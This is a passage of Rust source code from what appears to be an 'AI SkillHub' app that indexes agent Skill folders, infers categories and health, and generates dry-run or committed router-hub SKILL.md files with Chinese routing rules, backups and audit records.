                source_tree_skill_folder_name(source, &skill_dir, &name, &mut used_folder_names);
            let inferred = metadata::analyze_skill(&skill_dir);
            let category = configured_sources
                .get(&source.name.to_lowercase())
                .map(|source| source.category_id.clone())
                .filter(|value| !value.is_empty() && !value.eq_ignore_ascii_case("auto"))
                .or_else(|| {
                    (!inferred.category.is_empty()
                        && !inferred.category.eq_ignore_ascii_case("auto"))
                    .then(|| inferred.category.clone())
                })
                .or_else(|| {
                    (!source.category_id.is_empty()
                        && !source.category_id.eq_ignore_ascii_case("auto"))
                    .then(|| source.category_id.clone())
                })
                .unwrap_or_else(|| "auto".to_string());
            let description = inferred.summary.clone();
            let relative_path = source_tree_relative_path(sources_dir, &skill_dir);
            let is_router_hub = compute_is_router_hub(
                &description,
                &relative_path,
                &source.name,
                &folder_name,
                &name,
            );

            known_identity_keys.insert(identity_key);
            skills.push(SkillCard {
                id: stable_id("skill", &folder_name),
                source_id: source.id.clone(),
                name,
                folder_name,
                category,
                description,
                note: String::new(),
                source: source.name.clone(),
                health: source_tree_skill_health(&skill_dir),
                enabled: source.enabled,
                rating: 0,
                relative_path,
                tags: inferred.tags,
                usage_guide: inferred.usage_guide,
                metadata_origin: inferred.origin,
                metadata_confidence: inferred.confidence,
                is_router_hub,
                user_folder_id: String::new(),
                user_folder_name: String::new(),
                user_folder_color: String::new(),
            });
        }
    }

    skills
}

fn collect_skill_dirs_from_source(source_path: &Path) -> Vec<PathBuf> {
    let mut result = Vec::new();
    let mut stack = vec![(source_path.to_path_buf(), 0usize)];
    let mut visited = 0usize;

    while let Some((directory, depth)) = stack.pop() {
        if visited >= 3_500 || depth > 10 {
            continue;
        }
        visited += 1;

        let Ok(entries) = fs::read_dir(&directory) else {
            continue;
        };
        let mut has_skill_md = false;
        for entry in entries.flatten() {
            let file_name = entry.file_name().to_string_lossy().to_string();
            let Ok(file_type) = entry.file_type() else {
                continue;
            };

            if file_type.is_dir() {
                if !should_skip_import_scan_dir(&file_name) && file_name != ROUTER_HUB_FOLDER {
                    stack.push((entry.path(), depth + 1));
                }
            } else if file_type.is_file() && file_name.eq_ignore_ascii_case("SKILL.md") {
                has_skill_md = true;
            }
        }

        if has_skill_md {
            result.push(directory);
        }
    }

    result.sort_by_key(|path| path.display().to_string().to_lowercase());
    result
}

fn source_skill_identity_key(source: &str, name: &str) -> String {
    format!(
        "{}::{}",
        normalize_skill_lookup(source),
        normalize_skill_lookup(name)
    )
}

fn source_tree_skill_folder_name(
    source: &SourceCard,
    skill_dir: &Path,
    skill_name: &str,
    used_folder_names: &mut HashSet<String>,
) -> String {
    let fallback = normalize_skill_lookup(skill_name);
    let raw_folder = skill_dir
        .file_name()
        .and_then(|value| value.to_str())
        .map(|value| value.trim().to_string())
        .filter(|value| !value.is_empty())
        .unwrap_or_else(|| fallback.clone());
    let mut candidate = raw_folder;
    if candidate.eq_ignore_ascii_case("skills") || candidate.eq_ignore_ascii_case("skill") {
        candidate = fallback.clone();
    }
    if candidate.trim().is_empty() {
        candidate = normalize_skill_lookup(&source.name);
    }

    let base_candidate = candidate.clone();
    if used_folder_names.contains(&candidate.to_lowercase()) {
        let source_prefix = normalize_skill_lookup(&source.name);
        candidate = format!("{}__{}", source_prefix, normalize_skill_lookup(skill_name));
    }

    let mut suffix = 2usize;
    while used_folder_names.contains(&candidate.to_lowercase()) {
        candidate = format!("{}-{}", base_candidate, suffix);
        suffix += 1;
    }
    used_folder_names.insert(candidate.to_lowercase());
    candidate
}

fn source_tree_relative_path(sources_dir: &Path, skill_dir: &Path) -> String {
    let relative = skill_dir
        .strip_prefix(sources_dir)
        .unwrap_or(skill_dir)
        .display()
        .to_string();
    format!("github_sources\\{}", relative)
}

fn source_tree_skill_health(skill_dir: &Path) -> String {
    let skill_md = skill_dir.join("SKILL.md");
    if skill_md.exists() && check_router_hub_description_quoting(&skill_md).is_some() {
        return "warn".to_string();
    }
    if read_skill_name(&skill_md).is_some() && !read_skill_description(skill_dir).is_empty() {
        "ok".to_string()
    } else if skill_md.exists() {
        "info".to_string()
    } else {
        "warn".to_string()
    }
}

fn demote_single_source_root_skills(skills: &mut [SkillCard]) {
    let mut counts: HashMap<String, usize> = HashMap::new();
    for skill in skills.iter() {
        *counts
            .entry(normalize_skill_lookup(&skill.source))
            .or_insert(0) += 1;
    }

    for skill in skills.iter_mut() {
        if !skill.is_router_hub {
            continue;
        }
        if counts
            .get(&normalize_skill_lookup(&skill.source))
            .copied()
            .unwrap_or(0)
            != 1
        {
            continue;
        }
        if skill.description.contains(ROUTER_HUB_MARKER)
            || skill.description.contains(CONFLICT_DISPATCHER_MARKER)
            || skill.relative_path.contains(ROUTER_HUB_FOLDER)
        {
            continue;
        }
        skill.is_router_hub = false;
    }
}

fn parse_agents(diagnostics: Option<&Value>) -> Vec<AgentCard> {
    let Some(agents) = diagnostics
        .and_then(|root| root.get("agents"))
        .and_then(Value::as_array)
    else {
        return Vec::new();
    };

    agents
        .iter()
        .map(|agent| {
            let id = json_string(agent, "id");
            let command = json_string(agent, "command");
            let skills_dirs = agent
                .get("skillsDirs")
                .and_then(Value::as_array)
                .cloned()
                .unwrap_or_default();
            let raw_detected = json_bool(agent, "detected");
            let supports_split_detection = matches!(id.as_str(), "claude" | "codex");
            let explicit_product_detection = supports_split_detection
                && (json_bool(agent, "desktopDetected") || json_bool(agent, "codeDetected"));
            let directory_only_detection = raw_detected
                && command.trim().is_empty()
                && !explicit_product_detection
                && skills_dirs.iter().any(|dir| {
                    json_bool(dir, "exists")
                        || json_bool(dir, "isLink")
                        || json_bool(dir, "writable")
                });
            let detected = raw_detected && !directory_only_detection;
            let local_skill_capable = match id.as_str() {
                // Current ChatGPT Desktop and Codex builds discover standalone
                // user Skills from $HOME/.agents/skills. A CLI installation is
                // therefore no longer required for the OpenAI adapter.
                "codex" => {
                    !explicit_product_detection
                        || json_bool(agent, "desktopDetected")
                        || json_bool(agent, "codeDetected")
                }
                "claude" => !explicit_product_detection || json_bool(agent, "codeDetected"),
                _ => true,
            };
            let managed = skills_dirs.iter().any(|dir| {
                json_bool(dir, "isLink")
                    || json_bool(dir, "containsSkillMd")
                    || (dir.get("containsSkillMd").is_none() && json_bool(dir, "writable"))
            }) && detected
                && local_skill_capable;
            AgentCard {
                id,
                name: json_string(agent, "name"),
                path: skills_dirs
                    .first()
                    .map(|dir| json_string(dir, "path"))
                    .unwrap_or_default(),
                detected,
                managed,
                enabled: detected && managed,
                skill_count: 0,
            }
        })
        .collect()
}

fn infer_source_name(target: &str, sources_dir: &Path) -> Option<String> {
    if target.is_empty() {
        return None;
    }
    let normalized_target = target.replace('/', "\\").to_lowercase();
    let normalized_sources = sources_dir
        .display()
        .to_string()
        .replace('/', "\\")
        .to_lowercase();
    let prefix = format!("{}\\", normalized_sources);
    let relative = normalized_target.strip_prefix(&prefix)?;
    relative.split('\\').next().map(|part| part.to_string())
}

fn infer_source_type(path: &Path) -> String {
    if has_skill_md_descendant(path) {
        "skill".to_string()
    } else {
        "prompt".to_string()
    }
}

fn source_health(path: &Path, config: Option<&SourceConfig>) -> String {
    if config
        .map(|item| item.source_type.eq_ignore_ascii_case("prompt"))
        .unwrap_or(false)
    {
        return "info".to_string();
    }
    if has_skill_md_descendant(path) {
        "ok".to_string()
    } else {
        "warn".to_string()
    }
}

fn source_created_at(path: &Path) -> String {
    fs::metadata(path)
        .ok()
        .and_then(|metadata| metadata.created().or_else(|_| metadata.modified()).ok())
        .and_then(system_time_to_unix_nanos_string)
        .unwrap_or_else(unix_timestamp_string)
}

fn system_time_to_unix_nanos_string(value: SystemTime) -> Option<String> {
    value
        .duration_since(UNIX_EPOCH)
        .ok()
        .map(|duration| duration.as_nanos().to_string())
}

fn skill_health(path: &Path, diagnostic: Option<&SkillDiagnostic>) -> String {
    // A [ROUTER-HUB] description that is not wrapped in quotes is silently dropped by
    // strict YAML parsers — always demote to warn so the UI surfaces it.
    let skill_md = path.join("SKILL.md");
    if skill_md.exists() && check_router_hub_description_quoting(&skill_md).is_some() {
        return "warn".to_string();
    }
    if let Some(item) = diagnostic {
        if item.has_skill_md && item.has_front_matter && !item.description.is_empty() {
            return "ok".to_string();
        }
        if item.has_skill_md {
            return "info".to_string();
        }
        return "warn".to_string();
    }

    if skill_md.exists() {
        "info".to_string()
    } else {
        "warn".to_string()
    }
}

fn has_skill_md_descendant(path: &Path) -> bool {
    let Ok(entries) = fs::read_dir(path) else {
        return false;
    };

    for entry in entries.flatten() {
        let entry_path = entry.path();
        if entry_path.file_name().and_then(|name| name.to_str()) == Some("SKILL.md") {
            return true;
        }
        if entry_path.is_dir() && has_skill_md_descendant(&entry_path) {
            return true;
        }
    }
    false
}

fn read_skill_description(path: &Path) -> String {
    let skill_md = path.join("SKILL.md");
    let Ok(raw) = fs::read_to_string(skill_md) else {
        return String::new();
    };

    raw.lines()
        .find_map(|line| {
            line.strip_prefix("description:")
                .map(|value| value.trim().trim_matches('"').to_string())
        })
        .unwrap_or_default()
}

/// Build the canonical router-hub Skill name for a collection.
///
/// Per [skill-router-standard.md](../../../docs/skill-router-standard.md) rule 3, the parent
/// Skill must remain callable by the **original** collection name (e.g. `/nature-skills`).
/// We must NOT append a global suffix like `-hub`; doing so breaks every prompt that says
/// "use the /nature-skills collection".
///
/// A source-root Skill may share this name. That is safe because recipients receive
/// only the generated parent entry; the original source file remains a child route.
fn router_hub_skill_name(collection: &str) -> String {
    normalize_skill_lookup(collection)
}

/// Compose the body of a generated router-hub SKILL.md.
fn build_router_hub_skill_md(
    collection: &str,
    router_name: &str,
    children: &[String],
    child_links: &BTreeMap<String, (String, String, String)>,
) -> String {
    let mut child_lines = String::new();
    for child in children {
        let key = normalize_skill_lookup(child);
        let (relative_path, summary) = child_links
            .get(&key)
            .map(|(_, relative, summary)| {
                (
                    relative.as_str(),
                    localized_router_child_summary(child, summary),
                )
            })
            .unwrap_or_else(|| ("SKILL.md", format!("用于处理“{}”相关任务。", child)));
        child_lines.push_str(&format!(
            "- {} `${}` — {} 来源文件：`../../{}/{}`\n",
            CHILD_SKILL_MARKER, child, summary, collection, relative_path
        ));
    }
    let mut seen_capabilities = BTreeSet::new();
    let capabilities = children
        .iter()
        .filter_map(|child| {
            let key = normalize_skill_lookup(child);
            let summary = child_links
                .get(&key)
                .map(|(_, _, summary)| summary.as_str())
                .unwrap_or_default();
            let capability = router_capability_label(child, summary);
            if seen_capabilities.insert(capability.clone()) {
                Some(capability)
            } else {
                None
            }
        })
        .take(5)
        .collect::<Vec<_>>();
    let capability_summary = if capabilities.is_empty() {
        "自动选择能力".to_string()
    } else {
        capabilities.join("、")
    };
    let description = format!("◈ 父 · {} 个子项 · {}", children.len(), capability_summary);
    // Keep the machine marker in an HTML comment instead of visible frontmatter.
    // Agent hosts still identify the generated parent deterministically, while
    // users see the concise `父 Skill` label in their Skill picker.
    format!(
        "---\n\
        name: {name}\n\
        description: \"{description}\"\n\
        ---\n\n\
        <!-- {marker} -->\n\n\
        # ◈ 父 Skill · {collection}\n\n\
        > 这是 AI SkillHub 生成的稳定父入口。Agent 只需识别这个入口，子 Skill 由父 Skill 在自己的来源目录内选择和加载。\n\n\
        - 管理来源：`{collection}`\n\n\
        父路由生成在作者仓库之外，因此 GitHub 更新不会覆盖标记、子 Skill 清单或隔离规则。\n\n\
        类型：AI SkillHub 管理的父 Skill；下方 {child_marker} 表示来源内的功能型子 Skill。\n\n\
        路由规则：\n\
        - 只能打开下方 `../../{collection}` 内明确列出的来源文件。\n\
        - 即使其它父 Skill 有同名子 Skill，也绝不跨来源替换。\n\
        - 用户明确指定子 Skill 时，直接打开并完整遵循对应来源文件。\n\
        - 用户只指定父 Skill 或描述宽泛任务时，自动选择能完成任务的最小子 Skill。\n\
        - 只有在任务存在实质性歧义或安全风险时才向用户提问。\n\
        - 使用与用户相同的语言回答；子 Skill 原文为英文时也要给出自然中文说明。\n\n\
        此父 Skill 包含的子 Skill：\n\
        {children}",
        name = router_name,
        description = yaml_double_quoted(&description),
        marker = ROUTER_HUB_MARKER,
        child_marker = CHILD_SKILL_MARKER,
        collection = collection,
        children = child_lines,
    )
}

fn yaml_double_quoted(value: &str) -> String {
    value.replace('\\', "\\\\").replace('"', "\\\"")
}

fn router_capability_label(name: &str, raw: &str) -> String {
    let text = format!("{} {}", name, raw).to_lowercase();
    let contains_any = |keywords: &[&str]| keywords.iter().any(|keyword| text.contains(keyword));
    if contains_any(&[
        "figure",
        "plot",
        "chart",
        "diagram",
        "visualization",
        "科研图",
        "绘图",
        "图表",
        "可视化",
    ]) {
        "科研绘图".to_string()
    } else if contains_any(&[
        "citation",
        "reference",
        "bibliography",
        "doi",
        "参考文献",
        "引用",
    ]) {
        "参考文献".to_string()
    } else if contains_any(&[
        "review",
        "reviewer",
        "rebuttal",
        "peer-review",
        "审稿",
        "评审",
        "审查",
    ]) {
        "论文审查".to_string()
    } else if contains_any(&[
        "paper",
        "manuscript",
        "writing",
        "draft",
        "academic",
        "润色",
        "论文写作",
        "科研论文",
    ]) {
        "论文撰写与润色".to_string()
    } else if contains_any(&[
        "literature",
        "research",
        "search",
        "survey",
        "arxiv",
        "文献检索",
        "综述",
    ]) {
        "文献检索与综述".to_string()
    } else if contains_any(&[
        "security",
        "secure",
        "audit",
        "vulnerability",
        "threat",
        "安全检查",
        "风险分析",
    ]) {
        "安全审计".to_string()
    } else if contains_any(&[
        "browser",
        "web",
        "scrape",
        "crawl",
        "playwright",
        "网页浏览",
        "浏览器自动化",
    ]) {
        "网页与浏览器自动化".to_string()
    } else if contains_any(&["slide", "presentation", "ppt", "deck", "演示文稿"]) {
        "演示文稿".to_string()
    } else if contains_any(&[
        "database",
        "dataset",
        "analysis",
        "statistics",
        "omics",
        "数据分析",
        "统计",
    ]) {
        "数据分析".to_string()
    } else if contains_any(&[
        "image",
        "photo",
        "illustration",
        "render",
        "图像生成",
        "视觉内容",
    ]) {
        "图像设计".to_string()
    } else if contains_any(&[
        "design",
        "ui",
        "ux",
        "frontend",
        "layout",
        "界面设计",
        "前端实现",
    ]) {
        "界面设计".to_string()
    } else if contains_any(&[
        "code",
        "debug",
        "test",
        "developer",
        "android",
        "ios",
        "代码实现",
        "调试",
    ]) {
        "代码工程".to_string()
    } else {
        let readable = name.replace(['-', '_'], " ");
        let mut chars = readable.chars();
        let clipped = chars.by_ref().take(16).collect::<String>();
        if chars.next().is_some() {
            format!("{}…", clipped)
        } else {
            clipped
        }
    }
}

fn localized_router_child_summary(name: &str, raw: &str) -> String {
    if raw
        .chars()
        .any(|ch| matches!(ch as u32, 0x3400..=0x4dbf | 0x4e00..=0x9fff | 0xf900..=0xfaff))
    {
        return raw.trim().to_string();
    }

    let text = format!("{} {}", name, raw).to_lowercase();
    let summary = if ["figure", "plot", "chart", "diagram", "visualization"]
        .iter()
        .any(|keyword| text.contains(keyword))
    {
        "用于科研图表的规划、生成、编辑与质量优化。"
    } else if ["citation", "reference", "verify", "evidence"]
        .iter()
        .any(|keyword| text.contains(keyword))
    {
        "用于引用、参考文献与证据的核验和整理。"
    } else if ["review", "reviewer", "rebuttal"]
        .iter()
        .any(|keyword| text.contains(keyword))
    {
        "用于论文评审、修改建议与审稿回复。"
    } else if ["paper", "manuscript", "writing", "draft", "academic"]
        .iter()
        .any(|keyword| text.contains(keyword))
    {
        "用于科研论文的写作、润色与结构优化。"
    } else if ["literature", "research", "search", "survey"]
        .iter()
        .any(|keyword| text.contains(keyword))
    {
        "用于文献检索、研究分析与综述整理。"
    } else if ["security", "secure", "audit", "vulnerability"]
        .iter()
        .any(|keyword| text.contains(keyword))
    {
        "用于安全检查、风险分析与修复建议。"
    } else if ["browser", "web", "scrape", "crawl"]
        .iter()
        .any(|keyword| text.contains(keyword))
    {
        "用于网页浏览、信息提取与浏览器自动化。"
    } else if ["slide", "presentation", "ppt", "deck"]
        .iter()
        .any(|keyword| text.contains(keyword))
    {
        "用于演示文稿的规划、制作与视觉优化。"
    } else if ["database", "data", "dataset", "analysis"]
        .iter()
        .any(|keyword| text.contains(keyword))
    {
        "用于数据检索、处理、分析与结果解释。"
    } else if ["image", "photo", "illustration"]
        .iter()
        .any(|keyword| text.contains(keyword))
    {
        "用于图像生成、编辑与视觉内容制作。"
    } else if ["design", "ui", "ux", "frontend", "layout"]
        .iter()
        .any(|keyword| text.contains(keyword))
    {
        "用于界面设计、前端实现与体验优化。"
    } else if ["code", "debug", "test", "developer"]
        .iter()
        .any(|keyword| text.contains(keyword))
    {
        "用于代码实现、调试、测试与工程质量改进。"
    } else {
        return format!("用于处理“{}”相关任务。", name);
    };
    summary.to_string()
}

fn write_generated_skill_safely(path: &Path, body: &str) -> Result<(), String> {
    let parent = path
        .parent()
        .ok_or_else(|| format!("Generated Skill path has no parent: {}", path.display()))?;
    fs::create_dir_all(parent).map_err(|error| {
        format!(
            "Cannot create generated Skill folder {}: {}",
            parent.display(),
            error
        )
    })?;
    let temp = parent.join("SKILL.md.skillhub-tmp");
    let backup = parent.join("SKILL.md.skillhub-previous");
    fs::write(&temp, body)
        .map_err(|error| format!("Cannot stage generated Skill {}: {}", temp.display(), error))?;
    if backup.exists() {
        fs::remove_file(&backup).map_err(|error| {
            format!(
                "Cannot clear previous generated Skill backup {}: {}",
                backup.display(),
                error
            )
        })?;
    }
    if path.exists() {
        fs::rename(path, &backup).map_err(|error| {
            format!(
                "Cannot protect previous generated Skill {}: {}",
                path.display(),
                error
            )
        })?;
    }
    if let Err(error) = fs::rename(&temp, path) {
        if backup.exists() {
            let _ = fs::rename(&backup, path);
        }
        let _ = fs::remove_file(&temp);
        return Err(format!(
            "Cannot activate generated Skill {}: {}",
            path.display(),
            error
        ));
    }
    if backup.exists() {
        fs::remove_file(&backup).map_err(|error| {
            format!(
                "Generated Skill updated, but previous copy could not be removed {}: {}",
                backup.display(),
                error
            )
        })?;
    }
    Ok(())
}

fn sync_skill_conflict_dispatchers(
    legacy_root: &Path,
    connection: &Connection,
) -> Result<usize, String> {
    let skills = read_indexed_skills(connection)?;
    let saved_choices = read_skill_conflict_choice_state(connection)?;
    sync_skill_conflict_dispatchers_for_skills(legacy_root, &skills, &saved_choices)
}

fn sync_skill_conflict_dispatchers_for_skills(
    legacy_root: &Path,
    _skills: &[SkillCard],
    _saved_choices: &HashMap<String, SkillConflictChoiceState>,
) -> Result<usize, String> {
    let sources_dir = active_sources_dir(legacy_root);
    let routers_root = sources_dir.join(ROUTER_HUB_FOLDER);
    let mut changed = 0usize;

    // Duplicate children are no longer published as global dispatchers. Each
    // generated parent opens only source-scoped child files, so same-name Skills
    // under other parents cannot shadow one another. Keep saved choices in SQLite
    // for rollback compatibility, but remove only our generated dispatcher files.
    if routers_root.exists() {
        let entries = fs::read_dir(&routers_root)
            .map_err(|error| format!("Cannot read generated router folder: {}", error))?;
        for entry in entries.flatten() {
            let Ok(file_type) = entry.file_type() else {
                continue;
            };
            if !file_type.is_dir() {
                continue;
            }
            let skill_md = entry.path().join("SKILL.md");
            let Ok(existing) = fs::read_to_string(&skill_md) else {
                continue;
            };
            if !existing.contains(CONFLICT_DISPATCHER_MARKER) {
                continue;
            }
            fs::remove_file(&skill_md).map_err(|error| {
                format!(
                    "Cannot remove stale conflict dispatcher {}: {}",
                    skill_md.display(),
                    error
                )
            })?;
            if entry
                .path()
                .read_dir()
                .map(|mut dir| dir.next().is_none())
                .unwrap_or(false)
            {
                let _ = fs::remove_dir(entry.path());
            }
            changed += 1;
        }
    }

    Ok(changed)
}

/// Check a SKILL.md file for the "unquoted [ROUTER-HUB] description" pitfall.
/// Returns Some(issue) when the description carries the marker but has no surrounding quote,
/// which YAML loaders treat as a flow sequence and drop silently.
fn check_router_hub_description_quoting(skill_md_path: &Path) -> Option<RouterHubHealthWarning> {
    let raw = fs::read_to_string(skill_md_path).ok()?;
    let in_frontmatter = raw.starts_with("---");
    if !in_frontmatter {
        return None;
    }
    // Inspect only the frontmatter block (between the first two `---` lines).
    let mut frontmatter = String::new();
    let mut started = false;
    for line in raw.lines() {
        if line.trim_end() == "---" {
            if started {
                break;
            }
            started = true;
            continue;
        }
        if started {
            frontmatter.push_str(line);
            frontmatter.push('\n');
        }
    }
    for line in frontmatter.lines() {
        let lowered = line.trim_start();
        if !lowered.starts_with("description:") {
            continue;
        }
        let value = lowered.trim_start_matches("description:").trim_start();
        if !value.contains(ROUTER_HUB_MARKER) {
            return None;
        }
        let first_char = value.chars().next().unwrap_or(' ');
        // Accept either single or double quoted scalar.
        if first_char == '"' || first_char == '\'' {
            return None;
        }
        return Some(RouterHubHealthWarning {
            skill_md_path: skill_md_path.display().to_string(),
            issue: format!(
                "description starts with {} but is not quoted; YAML may drop this Skill",
                ROUTER_HUB_MARKER
            ),
        });
    }
    None
}

/// Walk a source/collection and collect every callable source-scoped Skill,
/// including a SKILL.md at the source root.
fn collect_child_skill_links_for_collection(
    collection_dir: &Path,
) -> BTreeMap<String, (String, String, String)> {
    let mut links = BTreeMap::new();
    let mut pending = vec![collection_dir.to_path_buf()];
    let mut visited_dirs = 0usize;

    while let Some(dir) = pending.pop() {
        visited_dirs += 1;
        if visited_dirs > SOURCE_IMPORT_MAX_FILES {
            break;
        }

        let skill_md = dir.join("SKILL.md");
        if skill_md.is_file() {
            let name = read_skill_name(&skill_md).or_else(|| {
                dir.file_name()
                    .and_then(|value| value.to_str())
                    .map(str::to_string)
            });
            if let Some(name) = name {
                let key = normalize_skill_lookup(&name);
                if !key.is_empty() {
                    let relative = skill_md
                        .strip_prefix(collection_dir)
                        .unwrap_or(&skill_md)
                        .to_string_lossy()
                        .replace('\\', "/");
                    let summary = metadata::analyze_skill(&dir).summary;
                    links.entry(key).or_insert((name, relative, summary));
                }
            }
        }

        let Ok(entries) = fs::read_dir(&dir) else {
            continue;
        };
        let mut child_dirs = entries
            .flatten()
            .filter_map(|entry| {
                let file_type = entry.file_type().ok()?;
                if !file_type.is_dir() || file_type.is_symlink() {
                    return None;
                }
                let name = entry.file_name().to_string_lossy().to_string();
                if matches!(
                    name.as_str(),
                    ".git" | "node_modules" | "target" | ROUTER_HUB_FOLDER
                ) {
                    return None;
                }
                Some(entry.path())
            })
            .collect::<Vec<_>>();
        child_dirs.sort_by(|left, right| {
            left.to_string_lossy()
                .to_lowercase()
                .cmp(&right.to_string_lossy().to_lowercase())
        });
        for child in child_dirs.into_iter().rev() {
            pending.push(child);
        }
    }

    links
}

/// Read just the `name:` field of a SKILL.md frontmatter.
fn read_skill_name(skill_md_path: &Path) -> Option<String> {
    let raw = fs::read_to_string(skill_md_path).ok()?;
    raw.lines()
        .find_map(|line| {
            line.strip_prefix("name:").map(|value| {
                value
                    .trim()
                    .trim_matches('"')
                    .trim_matches('\'')
                    .to_string()
            })
        })
        .filter(|value| !value.is_empty())
}

/// Plan and (optionally) write parent / router-hub Skills for every collection
/// under the active UserData sources directory. Product rules:
/// - parent file lives in AI-SkillHub-local-routers/ (outside the author repo)
/// - description is double-quoted
/// - parent keeps the stable collection name, even for a single/root Skill source
/// - re-runnable on every sync without touching unmodified routers
fn plan_or_write_router_hubs(
    legacy_root: &Path,
    commit: bool,
    real_writes_enabled: bool,
) -> Result<RouterHubReport, String> {
    let sources_dir = active_sources_dir(legacy_root);
    let routers_root = sources_dir.join(ROUTER_HUB_FOLDER);
    let mut plans: Vec<RouterHubPlanCard> = Vec::new();
    let mut warnings: Vec<RouterHubHealthWarning> = Vec::new();
    let mut written_count = 0usize;
    let mut unchanged_count = 0usize;
    let mut skipped_count = 0usize;
    let mut active_parent_names = HashSet::new();

    let allow_write = commit && real_writes_enabled;

    if !sources_dir.exists() {
        return Ok(RouterHubReport {
            plans,
            routers_root: routers_root.display().to_string(),
            real_writes_enabled,
            committed: allow_write,
            total_collections: 0,
            written_count: 0,
            unchanged_count: 0,
            skipped_count: 0,
            health_warnings: warnings,
            duplicate_children: Vec::new(),
            summary: format!("github_sources 文件夹不存在：{}", sources_dir.display()),
        });
    }

    let entries = fs::read_dir(&sources_dir)
        .map_err(|error| format!("Cannot read github_sources: {}", error))?;

    for entry in entries.flatten() {
        let Ok(file_type) = entry.file_type() else {
            continue;
        };
        if !file_type.is_dir() {
            continue;
        }
        let collection_name = entry.file_name().to_string_lossy().to_string();
        // Skip our own router output folder and dotted folders.
        if collection_name == ROUTER_HUB_FOLDER || collection_name.starts_with('.') {
            continue;
        }
        let collection_dir = entry.path();
        let child_links = collect_child_skill_links_for_collection(&collection_dir);
        let children = child_links
            .values()
            .map(|(name, _, _)| name.clone())
            .collect::<Vec<_>>();

        // Walk one level of skill md files looking for unquoted [ROUTER-HUB] descriptions.
        for child in fs::read_dir(&collection_dir)
            .into_iter()
            .flatten()
            .flatten()
        {
            let skill_md = child.path().join("SKILL.md");
            if skill_md.exists() {
                if let Some(issue) = check_router_hub_description_quoting(&skill_md) {
                    warnings.push(issue);
                }
            }
        }

        if children.is_empty() {
            plans.push(RouterHubPlanCard {
                collection_name: collection_name.clone(),
                router_skill_name: String::new(),
                router_skill_md_path: String::new(),
                child_count: 0,
                children: Vec::new(),
                status: "skipped-empty".to_string(),
                summary: "no SKILL.md found in collection".to_string(),
            });
            skipped_count += 1;
            continue;
        }
        let router_name = router_hub_skill_name(&collection_name);
        active_parent_names.insert(router_name.clone());
        // The parent is the only host-visible entry for a managed source, so a
        // source-root child may safely share its name. The generated parent keeps
        // the stable invocation name and opens the original source-scoped file.

        let router_folder = routers_root.join(&router_name);
        let router_skill_md = router_folder.join("SKILL.md");
        let body =
            build_router_hub_skill_md(&collection_name, &router_name, &children, &child_links);
        let needs_write = if allow_write {
            match fs::read_to_string(&router_skill_md) {
                Ok(existing) => existing != body,
                Err(_) => true,
            }
        } else {
            true
        };

        if allow_write {
            if needs_write {
                write_generated_skill_safely(&router_skill_md, &body)?;
                written_count += 1;
            } else {
                unchanged_count += 1;
            }
        }

        plans.push(RouterHubPlanCard {
            collection_name: collection_name.clone(),
            router_skill_name: router_name.clone(),
            router_skill_md_path: router_skill_md.display().to_string(),
            child_count: children.len(),
            children: children.clone(),
            status: if allow_write && !needs_write {
                "unchanged".to_string()
            } else if allow_write {
                "written".to_string()
            } else {
                "planned".to_string()
            },
            summary: if allow_write && !needs_write {
                "router SKILL.md already matched the generated version".to_string()
            } else if allow_write {
                "router SKILL.md regenerated under AI-SkillHub-local-routers".to_string()
            } else {
                "dry-run plan; enable real writes to materialize".to_string()
            },
        });
    }

    if allow_write && routers_root.exists() {
        let entries = fs::read_dir(&routers_root)
            .map_err(|error| format!("Cannot inspect stale parent aliases: {}", error))?;
        for entry in entries.flatten() {
            let Ok(file_type) = entry.file_type() else {
                continue;
            };
            if !file_type.is_dir() {
                continue;
            }
            let folder_name = entry.file_name().to_string_lossy().to_string();
            if active_parent_names.contains(&folder_name) {
                continue;
            }
            let skill_md = entry.path().join("SKILL.md");
            let Ok(body) = fs::read_to_string(&skill_md) else {
                continue;
            };
            if !body.contains(ROUTER_HUB_MARKER) {
                continue;
            }
            fs::remove_file(&skill_md).map_err(|error| {
                format!(
                    "Cannot remove stale generated parent alias {}: {}",
                    skill_md.display(),
                    error
                )
            })?;
            if entry
                .path()
                .read_dir()
                .map(|mut items| items.next().is_none())
                .unwrap_or(false)
            {
                let _ = fs::remove_dir(entry.path());
            }
        }
    }

    plans.sort_by(|a, b| {
        a.collection_name
            .to_lowercase()
            .cmp(&b.collection_name.to_lowercase())
    });

    // Aggregate child Skill names that appear in 2+ collections — these are the
    // silent-shadow case (Claude only loads one SKILL.md with a given `name:`).
    let mut child_index: BTreeMap<String, Vec<String>> = BTreeMap::new();
    for plan in &plans {
        for child in &plan.children {
            let key = normalize_skill_lookup(child);
            if key.is_empty() {
                continue;
            }
            child_index
                .entry(key)
                .or_default()
                .push(plan.collection_name.clone());
        }
    }
    let mut duplicate_children: Vec<RouterHubDuplicateChild> = child_index
        .into_iter()
        .filter(|(_, owners)| owners.len() > 1)
        .map(|(child_name, mut collections)| {
            collections.sort();
            collections.dedup();
            RouterHubDuplicateChild {
                child_name,
                collections,
            }
        })
        .filter(|item| item.collections.len() > 1)
        .collect();
    duplicate_children.sort_by(|a, b| a.child_name.cmp(&b.child_name));

    let total_collections = plans
        .iter()
        .map(|plan| plan.collection_name.to_lowercase())
        .collect::<HashSet<_>>()
        .len();
    let summary = if allow_write {
        format!(
            "router-hub regeneration committed: {} written, {} unchanged, {} skipped, {} duplicate-children",
            written_count,
            unchanged_count,
            skipped_count,
            duplicate_children.len()
        )
    } else if commit && !real_writes_enabled {
        format!(
            "commit requested but real_writes_enabled = false; returned plan only ({} collections, {} duplicate-children)",
            total_collections,
            duplicate_children.len()
        )
    } else {
        format!(
            "router-hub dry-run plan ({} collections, {} duplicate-children)",
            total_collections,
            duplicate_children.len()
        )
    };

    Ok(RouterHubReport {
        plans,
        routers_root: routers_root.display().to_string(),
        real_writes_enabled,
        committed: allow_write,
        total_collections,
        written_count,
        unchanged_count,
        skipped_count,
        health_warnings: warnings,
        duplicate_children,
        summary,
    })
}

/// Write one `router_hub_regenerate` audit event so the user can trace what changed and roll back.
fn record_router_hub_audit(
    connection: &Connection,
    report: &RouterHubReport,
) -> Result<(), String> {
    let detail = serde_json::json!({
        "committed": report.committed,
        "realWritesEnabled": report.real_writes_enabled,
        "totalCollections": report.total_collections,
        "writtenCount": report.written_count,
        "unchangedCount": report.unchanged_count,
        "skippedCount": report.skipped_count,
        "duplicateCount": report.duplicate_children.len(),
        "warningCount": report.health_warnings.len(),
        "routersRoot": report.routers_root,
    });
    let summary = if report.committed {
        format!(
            "router-hub committed: {} written, {} unchanged, {} skipped, {} duplicate-children, {} health warnings",
            report.written_count,
            report.unchanged_count,
            report.skipped_count,
            report.duplicate_children.len(),
            report.health_warnings.len()
        )
    } else {
